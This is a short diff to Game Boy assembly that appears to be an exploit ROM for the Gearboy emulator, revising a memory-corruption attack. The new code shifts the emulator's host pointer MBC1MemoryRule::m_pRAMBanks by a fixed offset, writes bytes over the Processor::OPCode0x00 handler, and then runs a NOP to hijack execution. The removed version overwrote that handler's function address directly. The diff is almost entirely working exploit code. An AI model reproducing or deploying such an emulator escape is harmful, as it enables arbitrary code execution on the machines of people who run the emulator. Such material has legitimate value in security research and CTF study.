@@ -41,26 +41,26 @@
 
 .org $200
 main:
-    ; Leak gearboy code address
-    ld a, ($D960) ; opcode=FA
-    ld ($C000), a
-    ld a, ($D961)
-    ld ($C001), a
-    ld a, ($D962)
-    ld ($C002), a
-    ld a, ($D963)
-    ld ($C003), a
-    ld a, ($D964)
-    ld ($C004), a
-    ld a, ($D965)
-    ld ($C005), a
+    ; Subtract 0x61e10 from ptr MBC1MemoryRule::m_pRAMBanks.
+    ld a, ($D9C8)
+    sub a, 0x10
+    ld ($D9C8), a
+    ld a, ($D9C9)
+    sbc a, 0x1e
+    ld ($D9C9), a
+    ld a, ($D9CA)
+    sbc a, 0x06
+    ld ($D9CA), a
 
-    ; Overwrite function address of Processor::OPCode0x00
-    ld a, 0xf0
-    ld ($D960), a
-    ld ($D961), a
+    ; Corrupt Processor::OPCode0x00
+    ld a, $FF
+    ld ($a000), a
+    ld ($a001), a
+    ld ($a002), a
+    ld ($a002), a
 
     ; Redirect code execution
     nop           ; opcode=00
+
 halt:
     jp halt
